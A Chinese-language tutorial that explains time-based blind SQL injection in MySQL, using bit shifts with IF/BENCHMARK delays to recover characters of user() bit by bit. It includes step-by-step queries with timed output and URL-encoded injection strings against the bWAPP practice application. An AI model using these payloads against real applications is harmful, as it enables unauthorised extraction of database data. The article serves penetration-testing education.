### 使用位移技术进行基于时间的SQL盲注攻击

#### 背景
在2011年至2012年期间，我对多个集成MySQL数据库的PHP应用程序进行了渗透测试，发现这些数据库容易受到基于时间的SQL盲注攻击。由于各种限制和阻碍，处理这种攻击变得有些棘手。因此，我需要找到一种方法，能够以最小的数据检索量来完成攻击。在这个过程中，我发现了一种使用位移技术进行SQL注入的方法。

最近，在Hack the Box CTF比赛中，我又一次使用了这种方法来处理一些复杂的SQL注入问题。本文将详细介绍如何利用“右移”运算符（`>>`）来枚举从SQL查询返回的二进制形式的值。

#### 位移运算符简介
位移运算符是用于将一个二进制数按指定的位数向左或向右移动的操作符。例如：
```sql
mysql> SELECT ASCII(b'01110010');
+--------------------+
| ascii(b'01110010') |
+--------------------+
|                114 |
+--------------------+
1 row in set (0.00 sec)

mysql> SELECT ASCII(b'01110010') >> 1;
+-------------------------+
| ascii(b'01110010') >> 1 |
+-------------------------+
|                      57 |
+-------------------------+
1 row in set (0.00 sec)
```
这可以用于枚举通过SQL盲注获取的字符串中的字符。如果数据出现在ASCII表中，则每个字符最多可以枚举8次。

#### 实例演示
假设我们希望通过此方法提取的数据是查询 `SELECT user()` 返回的第一个字符。我们将逐步枚举这个字符的每一位二进制值。

##### 第一位
首先，我们确定第一位的值：
- **可能性**：0 或 1
- **SQL查询**：
  ```sql
  mysql> SELECT IF((ASCII(SUBSTR(user(), 1, 1)) >> 7) = 0, BENCHMARK(10000000, SHA1('test')), 'false');
  +--------------------------------------------------------------------------------------+
  | if ((ascii((substr(user(),1,1))) >> 7 )=0,benchmark(10000000,sha1('test')), 'false') |
  +--------------------------------------------------------------------------------------+
  | 0                                                                                    |
  +--------------------------------------------------------------------------------------+
  1 row in set (2.35 sec)
  ```
- **结果**：存在时延，条件为TRUE，即第一位为0。
  - 当前二进制值：**0** ????????

##### 第二位
接下来，我们确定第二位的值：
- **可能性**：0 或 1
- **SQL查询**：
  ```sql
  mysql> SELECT IF((ASCII(SUBSTR(user(), 1, 1)) >> 6) = 0, BENCHMARK(10000000, SHA1('test')), 'false');
  +--------------------------------------------------------------------------------------+
  | if ((ascii((substr(user(),1,1))) >> 6 )=0,benchmark(10000000,sha1('test')), 'false') |
  +--------------------------------------------------------------------------------------+
  | false                                                                                |
  +--------------------------------------------------------------------------------------+
  1 row in set (0.00 sec)
  ```
- **结果**：没有时延，条件为FALSE，即第二位为1。
  - 当前二进计值：**01** ?????

##### 第三位
然后，我们确定第三位的值：
- **可能性**：0 或 1
- **SQL查询**：
  ```sql
  mysql> SELECT IF((ASCII(SUBSTR(user(), 1, 1)) >> 5) = 2, BENCHMARK(10000000, SHA1('test')), 'false');
  +--------------------------------------------------------------------------------------+
  | if ((ascii((substr(user(),1,1))) >> 5 )=2,benchmark(10000000,sha1('test')), 'false') |
  +--------------------------------------------------------------------------------------+
  | false                                                                                |
  +--------------------------------------------------------------------------------------+
  1 row in set (0.00 sec)
  ```
- **结果**：没有时延，条件为FALSE，即第三位为1。
  - 当前二进制值：**011** ????

##### 第四位
继续确定第四位的值：
- **可能性**：0 或 1
- **SQL查询**：
  ```sql
  mysql> SELECT IF((ASCII(SUBSTR(user(), 1, 1)) >> 4) = 6, BENCHMARK(10000000, SHA1('test')), 'false');
  +--------------------------------------------------------------------------------------+
  | if ((ascii((substr(user(),1,1))) >> 4 )=6,benchmark(10000000,sha1('test')), 'false') |
  +--------------------------------------------------------------------------------------+
  | false                                                                                |
  +--------------------------------------------------------------------------------------+
  1 row in set (0.00 sec)
  ```
- **结果**：没有时延，条件为FALSE，即第四位为1。
  - 当前二进制值：**0111** ???

##### 第五位
确定第五位的值：
- **可能性**：0 或 1
- **SQL查询**：
  ```sql
  mysql> SELECT IF((ASCII(SUBSTR(user(), 1, 1)) >> 3) = 14, BENCHMARK(10000000, SHA1('test')), 'false');
  +---------------------------------------------------------------------------------------+
  | if ((ascii((substr(user(),1,1))) >> 3 )=14,benchmark(10000000,sha1('test')), 'false') |
  +---------------------------------------------------------------------------------------+
  | 0                                                                                     |
  +---------------------------------------------------------------------------------------+
  1 row in set (2.46 sec)
  ```
- **结果**：存在时延，条件为TRUE，即第五位为0。
  - 当前二进制值：**01110** ??

##### 第六位
确定第六位的值：
- **可能性**：0 或 1
- **SQL查询**：
  ```sql
  mysql> SELECT IF((ASCII(SUBSTR(user(), 1, 1)) >> 2) = 28, BENCHMARK(10000000, SHA1('test')), 'false');
  +---------------------------------------------------------------------------------------+
  | if ((ascii((substr(user(),1,1))) >> 2 )=28,benchmark(10000000,sha1('test')), 'false') |
  +---------------------------------------------------------------------------------------+
  | 0                                                                                     |
  +---------------------------------------------------------------------------------------+
  1 row in set (2.44 sec)
  ```
- **结果**：存在时延，条件为TRUE，即第六位为0。
  - 当前二进制值：**011100** ?

##### 第七位
确定第七位的值：
- **可能性**：0 或 1
- **SQL查询**：
  ```sql
  mysql> SELECT IF((ASCII(SUBSTR(user(), 1, 1)) >> 1) = 56, BENCHMARK(10000000, SHA1('test')), 'false');
  +---------------------------------------------------------------------------------------+
  | if ((ascii((substr(user(),1,1))) >> 1 )=56,benchmark(10000000,sha1('test')), 'false') |
  +---------------------------------------------------------------------------------------+
  | false                                                                                 |
  +---------------------------------------------------------------------------------------+
  1 row in set (0.00 sec)
  ```
- **结果**：没有时延，条件为FALSE，即第七位为1。
  - 当前二进制值：**0111001** ?

##### 第八位
最后，确定第八位的值：
- **可能性**：0 或 1
- **SQL查询**：
  ```sql
  mysql> SELECT IF((ASCII(SUBSTR(user(), 1, 1)) >> 0) = 114, BENCHMARK(10000000, SHA1('test')), 'false');
  +----------------------------------------------------------------------------------------+
  | if ((ascii((substr(user(),1,1))) >> 0 )=114,benchmark(10000000,sha1('test')), 'false') |
  +----------------------------------------------------------------------------------------+
  | 0                                                                                      |
  +----------------------------------------------------------------------------------------+
  1 row in set (2.33 sec)
  ```
- **结果**：存在时延，条件为TRUE，即第八位为0。
  - 最终二进制值：**01110010**

#### 结论
通过上述步骤，我们得出 `SELECT user()` 返回的第一个字符的二进制值为 **01110010**，其对应的十进制值为 **114**，即ASCII码为 'r' 的字符。

```sql
mysql> SELECT user();
+----------------+
| user()         |
+----------------+
| root@localhost |
+----------------+
1 row in set (0.00 sec)
```

#### 示例SQLi字符串
为了进一步说明这种类型的SQL盲注攻击，以下是bWAPP上易受攻击的应用程序中，针对 `SELECT user()` 返回的第一个字符的第一位和第八位的示例SQLi字符串：

1. **第一位返回TRUE条件**：
   ```
   test%27+and+if+((ascii((substr(user(),1,1)))+>>+7+)=0,benchmark(5000000,md5('test')),+'false')%23
   ```

2. **第一位返回FALSE条件**：
   ```
   test%27+and+if+((ascii((substr(user(),1,1)))+>>+7+)=1,benchmark(5000000,md5('test')),+'false')%23
   ```

3. **第八位返回TRUE条件**：
   ```
   test%27+and+if+((ascii((substr(user(),1,1)))+>>+0+)=114,benchmark(5000000,md5('test')),+'false')%23
   ```

如果您喜欢这篇文章，请分享给您的朋友。